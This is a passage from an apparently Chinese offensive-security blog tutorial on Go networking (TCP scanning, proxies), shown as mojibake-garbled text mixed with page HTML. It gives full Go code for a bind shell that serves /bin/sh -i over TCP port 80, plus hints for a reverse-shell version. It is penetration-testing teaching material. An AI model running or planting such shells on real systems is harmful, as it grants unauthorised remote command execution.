äºŒè¿›åˆ¶æ–‡ä»¶éƒ½ä¸åŒ…å«æ­¤åŠŸèƒ½)ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å‘ä½ å±•ç¤ºå¦‚ä½•åœ¨ Go ä¸­åˆ›å»ºå®ƒã€‚\né¦–å…ˆï¼ŒæŸ¥çœ‹ Go çš„ os/exec åŒ…ã€‚æˆ‘ä»¬å°†ä½¿ç”¨å®ƒè¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚è¯¥åŒ…å®šä¹‰äº†ä¸€ç§åä¸º Cmd çš„ç±»å‹ï¼Œå…¶ä¸­åŒ…å«è¿è¡Œå‘½ä»¤ä»¥åŠæ“ä½œ stdin å’Œ stdout æ‰€éœ€çš„æ–¹æ³•å’Œå±æ€§ã€‚è¿™é‡ŒæŠŠ stdin(ä¸€ä¸ªReader) å’Œ stdout((ä¸€ä¸ªWriter) é‡å®šå‘åˆ° Conn å®ä¾‹ï¼ˆæ—¢æ˜¯Readeråˆæ˜¯Writer)ã€‚\næ¥æ”¶åˆ°æ–°çš„è¿æ¥åï¼Œå¯ä»¥ä½¿ç”¨ os/exec ä¸­çš„å‡½æ•° Command(name string,argâ€¦string) åˆ›å»ºæ–°çš„ Cmd å®ä¾‹ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤åŠå…¶ä»»ä½•é€‰é¡¹ä½œä¸ºå‚æ•°ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå°† /bin/sh ç¡¬ç¼–ç ä¸ºå‘½ä»¤å¹¶å°† -i ä½œä¸ºå‚æ•°ï¼Œä»¥ä½¿æˆ‘ä»¬å¤„äºäº¤äº’æ¨¡å¼ï¼Œè¿™æ ·å°±å¯ä»¥æ›´å¯é åœ°æ“ä½œ stdin å’Œ stdout ã€‚\ncmd := exec.Command(\"/bin/sh\",\"-i\") è¿™å°†åˆ›å»º Cmd çš„å®ä¾‹ï¼Œä½†å°šæœªæ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªé€‰é¡¹æ“ä½œ stdin å’Œ stdout ã€‚ä½ å¯ä»¥ä½¿ç”¨å‰é¢è®¨è®ºçš„ Copy(Writer,Reader) æˆ–ç›´æ¥å°† Reader å’Œ Writer èµ‹ç»™ Cmd.è¿™é‡Œç›´æ¥å°† Conn å¯¹è±¡èµ‹ç»™ cmd.Stdin å’Œ cmd.Stdout ,å¦‚ä¸‹æ‰€ç¤ºã€‚\ncmd.Stdin = conn cmd.Stdout = conn å®Œæˆå‘½ä»¤å’Œæ•°æ®æµå¤„ç†çš„è®¾ç½®ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨ cmd.Run() è¿è¡Œå‘½ä»¤ã€‚\nif err := cmd.Run(); err != nil { // å¤„ç†é”™è¯¯ } ä»¥ä¸Šæ“ä½œå¾ˆé€‚åˆåœ¨ Linux ç³»ç»Ÿä¸Šè¿è¡Œã€‚ä½†æ˜¯ï¼Œåœ¨ Windows ç³»ç»Ÿä¸Šè¿è¡Œç¨‹åºæ—¶ï¼Œè‹¥ä½¿ç”¨ cmd.exe è€Œä¸ä½¿ç”¨ /bin/bash ,ä½ ä¼šå‘ç°ç”±äºæŸäº› Windows ç‰¹å®šçš„åŒ¿åç®¡é“å¤„ç†ï¼Œè¿æ¥çš„å®¢æˆ·ç«¯æ°¸è¿œä¸ä¼šæ”¶åˆ°å‘½ä»¤è¾“å‡ºã€‚è§£å†³æ­¤é—®é¢˜æœ‰ä¸¤ç§æ–¹æ¡ˆã€‚\né¦–å…ˆï¼Œå¯ä»¥é€šè¿‡è°ƒæ•´ä»£ç æ˜¾å¼å¼ºåˆ¶åˆ·æ–°æ ‡å‡†è¾“å‡ºä»¥é€‚åº”æ­¤ç»†å¾®å·®åˆ«ã€‚ä¸å†æ˜¯ç›´æ¥å°† Conn èµ‹ç»™ cmd.Stdout ,è€Œæ˜¯å®ç°ä¸€ä¸ªåŒ…è£… bufo.Writer(ä¸€ä¸ªç¼“å†²å†™å…¥å™¨)çš„è‡ªå®šä¹‰ Writer å¹¶æ˜¾å¼è°ƒç”¨å…¶ Flush æ–¹æ³•ä»¥å¼ºåˆ¶åˆ·æ–°è¯¥ç¼“å†²åŒºã€‚\nä»¥ä¸‹æ˜¯è‡ªå®šä¹‰çš„ writer å’Œ Flusherã€‚\n// Flusher åŒ…è£… bufio.Writerï¼Œæ˜¾å¼åˆ·æ–°æ‰€æœ‰å†™å…¥ type Flusher struct { w *bufio.Writer } // NewFlusher ä» io.Writeråˆ›å»ºä¸€ä¸ªæ–°çš„ Flusher func NewFlusher(w io.Writer) *Flusher { return \u0026Flusher{ w: bufio.NewWriter(w), } } // å†™å…¥æ•°æ®å¹¶æ˜¾å¼åˆ·æ–°ç¼“å†²åŒº func (f *Flusher) Write(b []byte) (int, error) { count, err := f.w.Write(b) if err != nil { return -1, err } if err := f.w.Flush(); err != nil { return -1, err } return count, err } ç±»å‹ Flusher å®ç°äº†å‡½æ•° Write([] byte) ï¼Œè¯¥å‡½æ•°å°†æ•°æ®å†™å…¥åº•å±‚çš„ç¼“å†² writer ,ç„¶ååˆ·æ–°è¾“å‡ºã€‚\nä½¿ç”¨è‡ªå®šä¹‰ writer çš„å®ç°ï¼Œå¯ä»¥è°ƒæ•´è¿æ¥å¤„ç†ç¨‹åºä»¥å®ä¾‹åŒ–æ­¤ Flusher è‡ªå®šä¹‰æ•°æ®ç±»å‹å¹¶å°†å…¶ç”¨äº cmd.Stdoutã€‚\nfunc handler(conn net.Conn) { // æ˜¾å¼è°ƒç”¨ /bin/sh å¹¶ä½¿ç”¨ -i è¿›å…¥äº¤äº’æ¨¡å¼ // è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒä½œä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º // å¯¹äº Windows ä½¿ç”¨ exec.Command(\"cmd.exe\") cmd := exec.Command(\"/bin/sh\", \"-i\") // å°†æ ‡å‡†è¾“å…¥è®¾ç½®ä¸ºæˆ‘ä»¬çš„è¿æ¥ cmd.Stdout = conn // ä»è¿æ¥åˆ›å»ºä¸€ä¸ª Flusher ç”¨äºæ ‡å‡†è¾“å‡º // è¿™æ ·å¯ä»¥ç¡®ä¿æ ‡å‡†è¾“å‡ºè¢«å……åˆ†åˆ·æ–°å¹¶é€šè¿‡ net.Conn å‘é€ cmd.Stdout = NewFlusher(conn) // è¿è¡Œå‘½ä»¤ if err := cmd.Run(); err != nil { log.Fatalln(err) } } è¿™ç§è§£å†³æ–¹æ¡ˆè™½ç„¶å¯è¡Œï¼Œä½†å¹¶ä¸æ˜¯å¾ˆä¼˜é›…ã€‚å°½ç®¡èƒ½æ»¡è¶³å·¥ä½œè¦æ±‚çš„ä»£ç è¦æ¯”ä¼˜é›…çš„ä»£ç æ›´é‡è¦ï¼Œä½†æˆ‘ä»¬å°†ä»¥æ­¤é—®é¢˜ä¸ºå¥‘æœºä»‹ç»å‡½æ•° io.Pipe(),è¯¥å‡½æ•°æ˜¯ Go çš„åŒæ­¥å†…å­˜ç®¡é“ï¼Œå¯ç”¨äºè¿æ¥ Reader å’Œ Writer ã€‚\nfunc handler(conn net.Conn) { // æ˜¾å¼è°ƒç”¨ /bin/sh å¹¶ä½¿ç”¨ -i è¿›å…¥äº¤äº’æ¨¡å¼ // è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒä½œä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º // å¯¹äº Windows ä½¿ç”¨ exec.Command(\"cmd.exe\") cmd := exec.Command(\"/bin/sh\", \"-i\") // å°†æ ‡å‡†è¾“å…¥è®¾ç½®ä¸ºæˆ‘ä»¬çš„è¿æ¥ rp, wp := io.Pipe() cmd.Stdin = conn cmd.Stdout = wp go io.Copy(conn, rp) cmd.Run() conn.Close() } è°ƒç”¨ io.Pipe() ä¼šåŒæ—¶åˆ›å»ºåŒæ­¥è¿æ¥çš„ä¸€ä¸ª reader å’Œä¸€ä¸ª writer â€”â€”ä»»ä½•è¢«å†™å…¥ writer çš„æ•°æ®ï¼ˆåœ¨æœ¬ç¤ºä¾‹ä¸­ä¸º wp )éƒ½ä¼šè¢« reader(rp) è¯»å–ã€‚å› æ­¤ï¼Œéœ€è¦å°† writer åˆ†é…ç»™ cmd.Stdout ï¼Œç„¶åä½¿ç”¨ io.Copy(conn,rp) å°† PipeReader é“¾æ¥åˆ° TCP è¿æ¥ã€‚å¯ä½¿ç”¨ goroutine é˜²æ­¢ä»£ç è¢«é˜»å¡ã€‚å‘½ä»¤çš„ä»»ä½•æ ‡å‡†è¾“å‡ºéƒ½å°†å‘é€åˆ° writer ,ç„¶åé€šè¿‡ç®¡é“ä¼ é€åˆ° reader å¹¶é€šè¿‡ TCP è¿æ¥è¾“å‡ºã€‚\nç°åœ¨æˆ‘ä»¬å·²ç»ä»ç­‰å¾…è¿æ¥çš„ TCP ç›‘å¬å™¨çš„è§’åº¦æˆåŠŸå®ç°äº† Netcat å¼ºå¤§çš„â€œå®‰å…¨å·¨æ´\"åŠŸèƒ½ã€‚ä½ å¯ä»¥å‚ç…§æœ¬ç« ç¤ºä¾‹è¯•ç€ä»è¿æ¥å®¢æˆ·ç«¯å°†æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ stdout å’Œ stdin é‡å®šå‘åˆ°è¿œç¨‹ç›‘å¬å™¨çš„è§’åº¦æ¥å®ç°è¯¥åŠŸèƒ½ã€‚å…¶å…·ä½“å®ç°ç•™å¾…ä½ å»æŒ–æ˜ï¼Œä¸‹é¢ä»…åˆ—å‡ºå‡ ç‚¹ä¾›ä½ å‚è€ƒã€‚\né€šè¿‡ net.Dial(network,address string) å»ºç«‹ä¸è¿œç¨‹ç›‘å¬å™¨çš„è¿æ¥ã€‚ é€šè¿‡ exec.Command(name string,arg..string) åˆå§‹åŒ–ä¸€ä¸ª Cmdã€‚ é‡å®šå‘ Stdin å’Œ Stdout ä»¥åˆ©ç”¨ net.Conn å¯¹è±¡ã€‚ è¿è¡Œå‘½ä»¤ã€‚ æ­¤æ—¶ï¼Œä¾¦å¬å™¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ªè¿æ¥ã€‚å‘é€åˆ°å®¢æˆ·ç«¯çš„ä»»ä½•æ•°æ®éƒ½åº”åœ¨å®¢æˆ·ç«¯ä¸Šç†è§£ä¸º stdin ,è€Œåœ¨ä¾¦å¬å™¨ä¸Šæ¥æ”¶åˆ°çš„ä»»ä½•æ•°æ®éƒ½åº”ç†è§£ä¸º stdout ã€‚\nå®ä¾‹å®Œæ•´ä»£ç ï¼š\npackage main import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handler(conn net.Conn) { // æ˜¾å¼è°ƒç”¨ /bin/sh å¹¶ä½¿ç”¨ -i è¿›å…¥äº¤äº’æ¨¡å¼ // è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒä½œä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º // å¯¹äº Windows ä½¿ç”¨ exec.Command(\"cmd.exe\") cmd := exec.Command(\"/bin/sh\", \"-i\") // å°†æ ‡å‡†è¾“å…¥è®¾ç½®ä¸ºæˆ‘ä»¬çš„è¿æ¥ rp, wp := io.Pipe() cmd.Stdin = conn cmd.Stdout = wp go io.Copy(conn, rp) cmd.Run() conn.Close() } func main() { // åœ¨æœ¬åœ°ç«¯å£ 80 ä¸Šç›‘å¬ listener, err := net.Listen(\"tcp\", \":80\") if err != nil { log.Fatalln(\"Unable to bind to port\") } for { conn, err := listener.Accept() if err != nil { log.Fatalln(\"Unable to accept connection\") } go handler(conn) } } ",
  "wordCount" : "9132",
  "inLanguage": "en",
  "datePublished": "2023-02-03T12:07:44+08:00",
  "dateModified": "2023-02-03T12:07:44+08:00",
  "author":[{
    "@type": "Person",
    "name": "N3bu74"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "N3bu74's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://n3bu74.github.io/img/N3bu74.png"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>



<script async src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>


<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://n3bu74.github.io" accesskey="h" title="N3bu74&#39;s Blog (Alt + H)">
            <img src="https://n3bu74.github.io/img/Q.gif" alt="logo" aria-label="logo"
                 height="35">N3bu74&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://n3bu74.github.io/search" title="ğŸ” æœç´¢ (Alt &#43; /)" accesskey=/>
                <span>ğŸ” æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/posts" title="ğŸ“š æ–‡ç« ">
                <span>ğŸ“š æ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/categories/" title="ğŸ“¦ åˆ†ç±»">
                <span>ğŸ“¦ åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/tags" title="ğŸ§© æ ‡ç­¾">
                <span>ğŸ§© æ ‡ç­¾</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/archives/" title="â±ï¸ æ—¶é—´è½´">
                <span>â±ï¸ æ—¶é—´è½´</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main page">
<article class="post-single">
    <div id="single-content">
        <header class="post-header">
            <div class="breadcrumbs"><a href="https://n3bu74.github.io">ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://n3bu74.github.io/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="https://n3bu74.github.io/posts/sec/">ğŸ’» å®‰å…¨</a></div>
            <h1 class="post-title">
                TCPã€æ‰«æå™¨å’Œä»£ç†
            </h1>
            <div class="post-description">
                Goé»‘å¸½å­æ¸—é€æµ‹è¯•ç¼–ç¨‹ä¹‹é“ä¸€ä¹‹TCPã€æ‰«æå™¨å’Œä»£ç†
            </div>
            <div class="post-meta">ğŸ“…&nbsp;<span title='2023-02-03 12:07:44 +0800 CST'>2023-02-03</span>&nbsp; &nbsp;â°&nbsp;2023-02-03&nbsp; &nbsp;ğŸ“ƒ:&nbsp;9132å­—&nbsp; &nbsp;â³&nbsp;19åˆ†é’Ÿ&nbsp; &nbsp;
ğŸ™â€â™‚ï¸&nbsp;N3bu74



                &nbsp; &nbsp; ğŸ§© &nbsp;
                <ul class="post-tags-meta">
                    <a href="https://n3bu74.github.io/tags/golang/">Golang</a>
                </ul>

                
                <span id="busuanzi_container_page_pv">
                &nbsp; ğŸ‘â€ğŸ—¨ <span id="busuanzi_value_page_pv"></span>
            </span>

</div>
        </header> 
        <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">æ–‡ç« ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#1tcp%e6%89%ab%e6%8f%8f" aria-label="1.TCPæ‰«æ">1.TCPæ‰«æ</a><ul>
                        
                <li>
                    <a href="#10-tcp%e6%8f%a1%e6%89%8b%e6%9c%ba%e5%88%b6" aria-label="1.0 TCPæ¡æ‰‹æœºåˆ¶">1.0 TCPæ¡æ‰‹æœºåˆ¶</a></li>
                <li>
                    <a href="#11-%e5%8d%95%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" aria-label="1.1 å•ä¸ªç«¯å£æ‰«æ">1.1 å•ä¸ªç«¯å£æ‰«æ</a></li>
                <li>
                    <a href="#12-%e9%9d%9e%e5%b9%b6%e5%8f%91%e6%89%ab%e6%8f%8f" aria-label="1.2 éå¹¶å‘æ‰«æ">1.2 éå¹¶å‘æ‰«æ</a></li>
                <li>
                    <a href="#13-%e5%b9%b6%e5%8f%91%e6%89%ab%e6%8f%8f" aria-label="1.3 å¹¶å‘æ‰«æ">1.3 å¹¶å‘æ‰«æ</a><ul>
                        
                <li>
                    <a href="#131-%e4%bd%bf%e7%94%a8-waitgroup-%e8%bf%9b%e8%a1%8c%e5%90%8c%e6%ad%a5%e6%89%ab%e6%8f%8f" aria-label="1.3.1 ä½¿ç”¨ WaitGroup è¿›è¡ŒåŒæ­¥æ‰«æ">1.3.1 ä½¿ç”¨ WaitGroup è¿›è¡ŒåŒæ­¥æ‰«æ</a></li>
                <li>
                    <a href="#132-%e4%bd%bf%e7%94%a8%e4%ba%ba%e5%b7%a5%e6%b1%a0%e8%bf%9b%e8%a1%8c%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" aria-label="1.3.2 ä½¿ç”¨äººå·¥æ± è¿›è¡Œç«¯å£æ‰«æ">1.3.2 ä½¿ç”¨äººå·¥æ± è¿›è¡Œç«¯å£æ‰«æ</a><ul>
                        
                <li>
                    <a href="#1321-%e5%8d%95%e9%80%9a%e9%81%93%e9%80%9a%e4%bf%a1" aria-label="1.3.2.1 å•é€šé“é€šä¿¡">1.3.2.1 å•é€šé“é€šä¿¡</a></li>
                <li>
                    <a href="#1322-%e5%a4%9a%e9%80%9a%e9%81%93%e9%80%9a%e4%bf%a1" aria-label="1.3.2.2 å¤šé€šé“é€šä¿¡">1.3.2.2 å¤šé€šé“é€šä¿¡</a></li></ul>
                </li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#2%e6%9e%84%e9%80%a0tcp%e4%bb%a3%e7%90%86" aria-label="2.æ„é€ TCPä»£ç†">2.æ„é€ TCPä»£ç†</a><ul>
                        
                <li>
                    <a href="#21-%e4%bd%bf%e7%94%a8-ioreader-%e5%92%8c-iowriter" aria-label="2.1 ä½¿ç”¨ io.Reader å’Œ io.Writer">2.1 ä½¿ç”¨ io.Reader å’Œ io.Writer</a></li>
                <li>
                    <a href="#22-%e5%88%9b%e5%bb%ba%e5%9b%9e%e6%98%be%e6%9c%8d%e5%8a%a1%e5%99%a8" aria-label="2.2 åˆ›å»ºå›æ˜¾æœåŠ¡å™¨">2.2 åˆ›å»ºå›æ˜¾æœåŠ¡å™¨</a></li>
                <li>
                    <a href="#23-%e9%80%9a%e8%bf%87%e5%88%9b%e5%bb%ba%e5%b8%a6%e7%bc%93%e5%86%b2%e7%9a%84%e7%9b%91%e5%90%ac%e5%99%a8%e6%9d%a5%e6%94%b9%e8%bf%9b%e4%bb%a3%e7%a0%81" aria-label="2.3 é€šè¿‡åˆ›å»ºå¸¦ç¼“å†²çš„ç›‘å¬å™¨æ¥æ”¹è¿›ä»£ç ">2.3 é€šè¿‡åˆ›å»ºå¸¦ç¼“å†²çš„ç›‘å¬å™¨æ¥æ”¹è¿›ä»£ç </a></li>
                <li>
                    <a href="#24-%e4%bb%a3%e7%90%86%e4%b8%80%e4%b8%aatcp%e5%ae%a2%e6%88%b7%e7%ab%af" aria-label="2.4 ä»£ç†ä¸€ä¸ªTCPå®¢æˆ·ç«¯">2.4 ä»£ç†ä¸€ä¸ªTCPå®¢æˆ·ç«¯</a></li>
                <li>
                    <a href="#25-%e5%a4%8d%e7%8e%b0-netcat-%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="2.5 å¤ç° Netcat å‘½ä»¤æ‰§è¡Œ">2.5 å¤ç° Netcat å‘½ä»¤æ‰§è¡Œ</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        
        activeElement = elements[0];
        const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
        document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
    }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
            const id = encodeURI(element.getAttribute('id')).toLowerCase();
            if (element === activeElement){
                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
            } else {
                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
            }
        })
    }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;
    }
</script>
        
        <div class="post-content"><h2 id="1tcpæ‰«æ">1.TCPæ‰«æ<a hidden class="anchor" aria-hidden="true" href="#1tcpæ‰«æ">#</a></h2>
<h3 id="10-tcpæ¡æ‰‹æœºåˆ¶">1.0 TCPæ¡æ‰‹æœºåˆ¶<a hidden class="anchor" aria-hidden="true" href="#10-tcpæ¡æ‰‹æœºåˆ¶">#</a></h3>
<blockquote>
<p>TCPä¸­æœ€é‡è¦çš„ä¸€ç‚¹å³ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ‰€è°“tcpå…¨è¿æ¥æ‰«æï¼ŒtcpåŠè¿æ¥æ‰«æç­‰éƒ½æ˜¯ä¾æ®ä¸‰æ¬¡æ¡æ‰‹çš„åŸºç¡€è¿›è¡Œçš„ï¼Œåªä¸è¿‡æ˜¯åœ¨æ¡æ‰‹çš„æ¬¡æ•°ä¸Šæœ‰åŒºåˆ«ã€‚ç®€å•æ¥è¯´ä¸‰æ¬¡æ¡æ‰‹åˆ†ä¸ºä¸‹é¢ä¸‰æ­¥ï¼š</p>
<p>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€synåŒ…ï¼Œè¡¨ç¤ºé€šä¿¡å¼€å§‹</p>
<p>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯å›å¤syn-ackä½œä¸ºç›¸åº”ï¼Œæç¤ºå®¢æˆ·ç«¯ä»¥ackç»“æŸ</p>
<p>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ackï¼Œé€šä¿¡å¼€å§‹</p>
</blockquote>
<p><img loading="lazy" src="image-20221208214736654.png" alt="image-20221208214736654"  />
</p>
<blockquote>
<p>1.å¦‚æœç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œåˆ™ä¼šè¿›è¡Œ3æ¬¡æ¡æ‰‹ã€‚é¦–å…ˆï¼Œå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªsynæ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…è¡¨ç¤ºé€šä¿¡å¼€å§‹;ç„¶åï¼ŒæœåŠ¡å™¨ä»¥syn-ackè¿›è¡Œå“åº”ï¼Œæç¤ºå®¢æˆ·ç«¯ä»¥ackä½œä¸ºç»“æŸ;ä¹‹åå°±å¯ä»¥è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚</p>
<p>2.å¦‚æœç«¯å£å…³é—­ï¼Œåˆ™æœåŠ¡å™¨ä¼šä»¥ä¸€ä¸ªrstæ•°æ®åŒ…è€Œä¸æ˜¯syn-ackè¿›è¡Œå“åº”ã€‚</p>
<p>3.å¦‚æœæµé‡è¢«é˜²ç«å¢™è¿‡æ»¤ï¼Œåˆ™å®¢æˆ·ç«¯é€šå¸¸ä¸ä¼šä»æœåŠ¡å™¨æ”¶åˆ°ä»»ä½•å“åº”ã€‚</p>
</blockquote>
<h3 id="11-å•ä¸ªç«¯å£æ‰«æ">1.1 å•ä¸ªç«¯å£æ‰«æ<a hidden class="anchor" aria-hidden="true" href="#11-å•ä¸ªç«¯å£æ‰«æ">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;www.baidu.com:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Connection successful&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Connection failed&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p>æˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ˜¯Goçš„netåŒ…ï¼š Dial(network string, address string) (Conn, error)ã€‚</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºæ ‡è¯†è¦å¯åŠ¨çš„è¿æ¥çš„ç±»å‹ã€‚å¯ä»¥æ˜¯TCPã€UNIXå¥—æ¥å­—ã€UDPå’Œç¬¬4å±‚åè®®çš„è¿æ¥ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‘Šè¯‰ Dialå‡½æ•° ä½ æƒ³è¦è¿æ¥çš„ä¸»æœºã€‚å¯¹äº IPv4/TCPè¿æ¥ï¼Œæ­¤å­—ç¬¦ä¸²å°†ä½¿ç”¨ host:port çš„å½¢å¼ã€‚</p>
<p>åˆ¤æ–­æ˜¯å¦è¿æ¥æˆåŠŸï¼šDial(network,address stringï¼‰è¿”å› Con å’Œ error ,å¦‚æœè¿æ¥æˆåŠŸ, error å°†ä¸º nilã€‚å› æ­¤,è¦éªŒè¯è¿æ¥,åªéœ€è¦æ£€æŸ¥ erroræ˜¯å¦ç­‰äºnil.</p>
</blockquote>
<h3 id="12-éå¹¶å‘æ‰«æ">1.2 éå¹¶å‘æ‰«æ<a hidden class="anchor" aria-hidden="true" href="#12-éå¹¶å‘æ‰«æ">#</a></h3>
<p>å½“æˆ‘ä»¬è¦å¯¹å¤šä¸ªç«¯å£æ‰«ææ—¶ï¼Œå°±è¦å¯¹ç«¯å£è¿›è¡Œæšä¸¾å¹¶æ‹¼æ¥åˆ° addressä¸­ï¼Œè¿™é‡Œå°±è¦å°†æ•´æ•°è½¬æ¢æˆå­—ç¬¦ä¸²å¹¶æ‹¼æ¥ï¼Œæˆ–è€…ç›´æ¥æ ¼å¼åŒ–è¾“å‡ºã€‚</p>
